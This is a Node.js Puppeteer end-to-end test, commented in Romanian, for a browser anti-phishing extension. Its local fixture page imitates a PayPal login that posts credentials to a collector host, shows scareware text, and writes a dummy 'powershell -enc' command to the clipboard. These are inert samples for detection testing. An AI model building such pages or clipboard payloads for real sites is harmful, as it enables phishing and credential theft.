// Test end-to-end în Chrome real (Chrome pentru testare/instalat), cu domenii *.example mapate pe un server local.
// NU accesează infrastructură externă: toate gazdele *.example sunt redirecționate către 127.0.0.1.
// Rulare: node tests/e2e/run-e2e.mjs [calea către chrome.exe]
import http from 'node:http';
import { mkdirSync, mkdtempSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import puppeteer from 'puppeteer-core';

const here = dirname(fileURLToPath(import.meta.url));
const ext = resolve(here, '..', '..');
const out = join(here, 'out'); mkdirSync(out, { recursive: true });
const chromePath = process.argv[2] || ['C:/Program Files/Google/Chrome/Application/chrome.exe', 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe'].find(existsSync);
if (!chromePath) { console.error('Nu am găsit Chrome/Edge.'); process.exit(2); }

const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok }); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${ok ? '' : '  → ' + detail}`); };

/* ---------------- server local: conținut în funcție de Host ---------------- */
const BEHAVIOR_PAGE = `<!doctype html><html><head><meta charset="utf-8"><title>Autentificare PayPal - demo</title>
<script src="http://cdn.thirdparty-demo.example/a.js"></script></head><body>
<h1>Demo comportament</h1><p>Your computer is infected! Press Win+R and paste the command to fix it.</p>
<form action="http://collector.thirdparty-demo.example/collect" method="post"><input name="u"><input type="password" name="p"><button>Intră</button></form>
<script>
 navigator.geolocation.getCurrentPosition(()=>{},()=>{});
 navigator.mediaDevices.getUserMedia({video:true}).catch(()=>{});
 navigator.clipboard.readText().catch(()=>{});
 Notification.requestPermission();
 navigator.clipboard.writeText('powershell -enc AAAAAAAA').catch(()=>{});
 fetch('http://api.thirdparty-demo.example/x',{method:'POST',body:'x'}).catch(()=>{});
</script></body></html>`;
const server = http.createServer((req, res) => {
  const host = (req.headers.host || '').split(':')[0];
  const send = (body, type = 'text/html; charset=utf-8', extra = {}) => { res.writeHead(200, { 'Content-Type': type, ...extra }); res.end(body); };
  if (req.url.endsWith('.exe') || req.url.includes('factura')) return send('MZ-fake-not-executable', 'application/octet-stream', { 'Content-Disposition': 'attachment; filename="factura.pdf.exe"' });
  if (req.url.endsWith('.js')) return send('/* gol */', 'application/javascript');
  if (host.startsWith('confirmed-malware')) return send('<title>PAGINA PERICULOASĂ (test)</title><h1 id="reached">PAGINA PERICULOASĂ (test)</h1>');
  if (host.startsWith('shop.legit-demo')) return send(BEHAVIOR_PAGE);
  if (host.startsWith('redirect.legit-demo')) { res.writeHead(302, { Location: 'http://confirmed-malware.sentinel-test.example/landing' }); return res.end(); }
  send(`<title>Pagină obișnuită</title><h1>Pagină obișnuită</h1><a id="dl" href="http://dl.legit-demo.example/factura.pdf.exe" download>descarcă</a>`);
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const PORT = server.address().port;

const profile = mkdtempSync(join(tmpdir(), 'ss-e2e-'));
const browser = await puppeteer.launch({
  executablePath: chromePath, headless: true, pipe: true, enableExtensions: [ext], userDataDir: profile,
  args: [`--host-resolver-rules=MAP *.example 127.0.0.1:${PORT}`, '--unsafely-treat-insecure-origin-as-secure=http://shop.legit-demo.example', '--use-fake-device-for-media-stream', '--use-fake-ui-for-media-stream', '--no-first-run', '--no-default-browser-check', '--disable-features=DisableLoadExtensionCommandLineSwitch']
});
let exitCode = 0;
try {
  const sw = await browser.waitForTarget((t) => t.type() === 'service_worker' && t.url().includes('/src/background/service-worker.js'), { timeout: 15000 });
  const extId = new URL(sw.url()).host;
  const worker = await sw.worker();
  check('Extensia se încarcă fără erori de manifest; service worker pornit', !!extId, 'fără service worker');
  const manifest = await worker.evaluate(() => chrome.runtime.getManifest());
  check('Manifest MV3, fără host_permissions, permisiuni minime', manifest.manifest_version === 3 && !manifest.host_permissions && manifest.permissions.join() === 'storage,webNavigation,downloads,alarms,activeTab', JSON.stringify(manifest.permissions));
  const activeTabId = async (p) => { await p.bringToFront(); return worker.evaluate(async () => (await chrome.tabs.query({ active: true, lastFocusedWindow: true }))[0].id); };

  // ---- 1. Pagină obișnuită: fără avertizare
  const page = await browser.newPage();
  await page.goto('http://plain.legit-demo.example/', { waitUntil: 'load' });
  check('Pagină obișnuită: nicio avertizare', (await page.title()) === 'Pagină obișnuită', await page.url());

  // ---- 2. Domeniu confirmat (listă de test): pagina de avertizare
  const p2 = await browser.newPage();
  await p2.goto('http://confirmed-malware.sentinel-test.example/payload', { waitUntil: 'load' }).catch(() => {});
  await p2.waitForFunction(() => location.protocol === 'chrome-extension:', { timeout: 8000 }).catch(() => {});
  const wurl = p2.url();
  check('Domeniu confirmat: redirecționat către pagina locală de avertizare', wurl.startsWith(`chrome-extension://${extId}/src/pages/warning/warning.html?id=`), wurl);
  check('URL-ul destinației nu apare în parametrii paginii de avertizare', !wurl.includes('malware') && !wurl.includes('payload'), wurl);
  await p2.waitForSelector('#title', { timeout: 5000 }).catch(() => {});
  const text = await p2.evaluate(() => document.body.innerText);
  await p2.screenshot({ path: join(out, 'warning-confirmed.png') });
  check('Avertizare: explicație, domeniu, sursă și butoane cerute', /Periculos/.test(text) && /confirmed-malware\.sentinel-test\.example/.test(text) && /Înapoi la siguranță/.test(text) && /Vezi analiza detaliată/.test(text) && /Liste locale/.test(text), text.slice(0, 300));
  check('Continuarea e separată, închisă implicit și cere acțiune deliberată', await p2.evaluate(() => { const d = document.querySelector('details.continue'); return !!d && !d.open && !document.querySelector('#back').contains(d) && document.querySelector('#confirm') !== null; }));
  await p2.click('#toggle'); await p2.screenshot({ path: join(out, 'warning-detail.png'), fullPage: true });
  const detailText = await p2.evaluate(() => document.querySelector('#detail').innerText);
  check('Analiza detaliată arată indicatori, surse și detalii tehnice', /surse consultate/i.test(detailText) && /detalii tehnice/i.test(detailText) && /reputation-malicious|Raportat ca periculos/.test(detailText), detailText.slice(0, 200));

  // ---- 3. Încercare de ocolire: confirmare prea devreme / greșită
  await p2.evaluate(() => { document.querySelector('details.continue').open = true; });
  const btnDisabled = await p2.$eval('details.continue button', (b) => b.disabled);
  check('Butonul „Continuă" este dezactivat la început', btnDisabled === true);
  await p2.type('#confirm', 'confirmed-malware.sentinel-test.example');
  check('Chiar cu domeniul scris corect, butonul rămâne blocat în timpul de gândire', await p2.$eval('details.continue button', (b) => b.disabled));
  await new Promise((r) => setTimeout(r, 8600));
  check('După timpul de gândire + confirmare corectă, butonul se deblochează', !(await p2.$eval('details.continue button', (b) => b.disabled)));
  // ocolire directă: o filă nouă către același URL trebuie să primească din nou avertizare
  const p3 = await browser.newPage();
  await p3.goto('http://confirmed-malware.sentinel-test.example/payload', { waitUntil: 'load' }).catch(() => {});
  await p3.waitForFunction(() => location.protocol === 'chrome-extension:', { timeout: 8000 }).catch(() => {});
  check('Ocolire prin navigare directă în altă filă: avertizare din nou', p3.url().includes('/warning/warning.html'), p3.url());
  await p3.close();
  // continuare deliberată
  await p2.click('details.continue button');
  await p2.waitForFunction(() => location.protocol === 'http:', { timeout: 8000 }).catch(() => {});
  check('Continuare deliberată: destinația se încarcă', p2.url().startsWith('http://confirmed-malware.sentinel-test.example/payload') && (await p2.title()).includes('PAGINA PERICULOASĂ'), p2.url());

  // ---- 4. Redirecționare de server către domeniu confirmat
  const p4 = await browser.newPage();
  await p4.goto('http://redirect.legit-demo.example/go', { waitUntil: 'load' }).catch(() => {});
  await p4.waitForFunction(() => location.protocol === 'chrome-extension:', { timeout: 8000 }).catch(() => {});
  check('Redirecționare de server către domeniu confirmat: avertizare', p4.url().includes('/warning/warning.html'), p4.url());
  const t4 = await p4.evaluate(() => document.body.innerText); await p4.screenshot({ path: join(out, 'warning-redirect.png') });
  check('Avertizarea de redirecționare menționează redirecționarea', /Redirecționare|redirecționat/.test(t4), t4.slice(0, 200));
  await p4.click('#back'); await new Promise((r) => setTimeout(r, 800));
  check('„Înapoi la siguranță" părăsește pagina periculoasă', /newtab|new-tab-page/.test(p4.url()), p4.url());

  // ---- 5. Domeniu IDN omograf (heuristic)
  const p5 = await browser.newPage();
  await p5.goto('http://xn--pple-43d.example/login', { waitUntil: 'load' }).catch(() => {});
  await p5.waitForFunction(() => location.protocol === 'chrome-extension:', { timeout: 8000 }).catch(() => {});
  await p5.waitForSelector('#title', { timeout: 4000 }).catch(() => {});
  const t5 = await p5.evaluate(() => document.body.innerText); await p5.screenshot({ path: join(out, 'warning-homograph.png') });
  check('Domeniu omograf: avertizare euristică (nu „confirmat"), cu forma Unicode și Punycode', /Periculos/.test(t5) && /xn--pple-43d\.example/.test(t5) && /evaluare euristică/.test(t5) && !/amenințare confirmată/.test(t5.split('\n')[0] ?? ''), t5.slice(0, 300));

  // ---- 6. Comportamentul paginii
  const p6 = await browser.newPage();
  const ctx = browser.defaultBrowserContext();
  await ctx.overridePermissions('http://shop.legit-demo.example', ['geolocation', 'notifications']).catch(() => {});
  await p6.goto('http://shop.legit-demo.example/', { waitUntil: 'load' });
  await new Promise((r) => setTimeout(r, 4500));
  const tabId = await activeTabId(p6);
  const pop = await browser.newPage();
  await pop.goto(`chrome-extension://${extId}/src/pages/popup/popup.html?tab=${tabId}`, { waitUntil: 'load' });
  await pop.waitForSelector('.level', { timeout: 8000 }).catch(() => {});
  await pop.evaluate(() => document.querySelectorAll('details.sec').forEach((d) => (d.open = true)));
  await new Promise((r) => setTimeout(r, 300));
  const pt = await pop.evaluate(() => document.body.innerText); await pop.screenshot({ path: join(out, 'popup-behavior.png'), fullPage: true });
  check('Popup: nivel de risc, domeniu și butoane cerute', /shop\.legit-demo\.example/.test(pt) && /Analizează pagina/.test(pt) && /Vezi raportul complet/.test(pt) && /Setări/.test(pt), pt.slice(0, 200));
  check('Popup: permisiuni observate (locație, cameră, clipboard, notificări)', /Locație/.test(pt) && /Cameră/.test(pt) && /Citire clipboard/.test(pt) && /Notificări/.test(pt), pt);
  check('Popup: diferențiază cerere observată / API disponibil', /Cerere observată|Acces obținut|Permisiune acordată/.test(pt) && /API disponibil/.test(pt), pt.slice(0, 600));
  check('Popup: domenii terțe observate vs deduse', /thirdparty-demo\.example/.test(pt), pt);
  check('Popup: formular de autentificare suspect (brand/titlu + destinație cross-site)', /PayPal/.test(pt) && /alt domeniu/.test(pt), pt.slice(0, 900));
  check('Popup: mesaj scareware / comandă în clipboard', /infectat|comandă/.test(pt), pt.slice(0, 900));
  const rep = await worker.evaluate(async (id) => { const r = await chrome.runtime.sendMessage({ type: 'ss.getTabReport', tabId: id }).catch(() => null); return r; }, tabId).catch(() => null);
  void rep;

  // ---- 7. Dashboard
  const dash = await browser.newPage();
  dash.on('pageerror', (e) => console.log('  [pagină dashboard] eroare:', e.message));
  dash.on('console', (m) => { if (m.type() === 'error') console.log('  [pagină dashboard] console:', m.text()); });
  await dash.goto(`chrome-extension://${extId}/src/pages/dashboard/dashboard.html`, { waitUntil: 'load' });
  await dash.waitForSelector('#tab-overview', { timeout: 5000 });
  await new Promise((r) => setTimeout(r, 600));
  const dt = await dash.evaluate(() => document.body.innerText); await dash.screenshot({ path: join(out, 'dashboard-overview.png'), fullPage: true });
  check('Dashboard: statistici reale din evenimentele de mai sus (nu inventate)', /pagini analizate/.test(dt) && /alerte „Periculos”/.test(dt) && !/Nu există încă date\./.test(dt.split('Liste de reputație')[0]), dt.slice(0, 400));
  await dash.click('#tab-history'); await new Promise((r) => setTimeout(r, 600));
  const ht = await dash.evaluate(() => document.querySelector('#panel').innerText); await dash.screenshot({ path: join(out, 'dashboard-history.png'), fullPage: true });
  check('Dashboard: istoric cu alertele înregistrate', /confirmed-malware\.sentinel-test\.example|Amenințare confirmată/.test(ht), ht.slice(0, 300));
  check('Jurnalul nu conține parametri sensibili', !/access_token/.test(ht));
  for (const id of ['trust', 'sources', 'privacy', 'protection']) { await dash.click(`#tab-${id}`); await new Promise((r) => setTimeout(r, 400)); await dash.screenshot({ path: join(out, `dashboard-${id}.png`), fullPage: true }); }
  const st = await dash.evaluate(() => document.querySelector('#panel').innerText);
  check('Dashboard: setări de protecție randate', /Protecție activă/.test(st));
  await dash.click('#tab-sources'); await new Promise((r) => setTimeout(r, 400));
  const sr = await dash.evaluate(() => document.querySelector('#panel').innerText);
  check('Surse externe: informare exactă despre datele transmise + consimțământ', /Ce date sunt transmise, cui și de ce/.test(sr) && /Înțeleg și sunt de acord/.test(sr), sr.slice(0, 300));

  // ---- 8. Securitate: o pagină web nu poate vorbi cu service worker-ul ca pagină a extensiei
  const webReply = await p6.evaluate(async (id) => { try { return await new Promise((res) => chrome.runtime.sendMessage(id, { type: 'ss.getConfig' }, (r) => res(r ?? String(chrome.runtime.lastError?.message)))); } catch (e) { return 'eroare: ' + e.message; } }, extId);
  check('Pagina web nu poate trimite mesaje către extensie (nu e externally_connectable)', typeof webReply === 'string' || webReply === undefined || webReply?.ok === false || webReply == null, JSON.stringify(webReply));
  const clip = await p6.evaluate(() => { try { return typeof window.chrome?.runtime?.sendMessage; } catch { return 'n/a'; } });
  void clip;

  // ---- 9. Descărcare cu extensie dublă
  const cdp = await browser.target().createCDPSession();
  const dlDir = join(profile, 'dl'); mkdirSync(dlDir, { recursive: true });
  await cdp.send('Browser.setDownloadBehavior', { behavior: 'allow', downloadPath: dlDir, eventsEnabled: true });
  const p9 = await browser.newPage();
  await p9.goto('http://dl.legit-demo.example/', { waitUntil: 'load' });
  const before = (await browser.pages()).length;
  await p9.click('#dl');
  await new Promise((r) => setTimeout(r, 3500));
  const pages = await browser.pages();
  const dlPage = pages.find((p) => p.url().includes('/warning/download.html'));
  check('Descărcare cu extensie dublă (.pdf.exe): oprită și pagină de avertizare deschisă', !!dlPage, pages.map((p) => p.url()).join(' | ') + ` (înainte: ${before})`);
  if (dlPage) {
    await dlPage.waitForSelector('#cancel', { timeout: 4000 }).catch(() => {});
    const dtxt = await dlPage.evaluate(() => document.body.innerText); await dlPage.screenshot({ path: join(out, 'download-warning.png'), fullPage: true });
    check('Avertizarea de descărcare explică extensia dublă și limitele analizei', /factura\.pdf\.exe/.test(dtxt) && /Extensie dublă/.test(dtxt) && /nu este scanat/.test(dtxt), dtxt.slice(0, 400));
    await dlPage.click('#cancel'); await new Promise((r) => setTimeout(r, 800));
    const done = await dlPage.evaluate(() => document.body.innerText);
    check('„Anulează descărcarea" anulează efectiv descărcarea', /anulată/.test(done), done.slice(-200));
  }
} catch (e) {
  console.error('EROARE e2e:', e);
  exitCode = 1;
} finally {
  await browser.close().catch(() => {});
  server.close();
  try { rmSync(profile, { recursive: true, force: true }); } catch { /* ignorat */ }
}
const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} verificări trecute. Capturi în ${out}`);
process.exit(exitCode || (failed.length ? 1 : 0));
